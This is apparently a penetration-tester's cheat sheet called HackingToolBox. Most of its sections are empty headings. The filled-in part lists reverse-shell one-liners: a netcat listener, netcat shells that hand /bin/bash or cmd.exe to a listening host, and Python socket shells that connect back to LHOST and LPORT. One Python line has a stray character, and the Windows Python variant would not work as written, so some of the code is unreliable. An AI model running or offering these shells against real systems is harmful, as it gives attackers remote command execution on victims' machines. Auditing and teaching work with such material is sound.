# HackingToolBox

**RHOST** : Ip address of the target machine  
**RPORT** : Listening port of the target machine  
**LHOST** : Ip address of the auditor computer  
**LPORT** : Listening port of the auditor computer  

## Énumération 
### Windows 
### Linux 
### Nmap
### FTP (File Transfer Protocol)
### SMB
### Web

## One-liner reverse shell
command to execute on the listener side to connect to the remote machine :
```bash
nc -lvp [LPORT]
```
### netcat
Linux : 
```bash
nc [LHOST] [LPORT] -e /bin/bash
```
Windows :
```bat
nc.exe [LHOST] [LPORT] -e cmd.exe
```
### python
Linux : 
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("LHOST",LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Windows : 
```bat
C:\Python26\python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);"
```
### perl
```perl

```
### bash
### php
### ruby
### telnet
### socat
### java

## Exploitation
### msfvenom
### metasploit
### searchsploit

## Bruteforce
### John the ripper
### Hydra
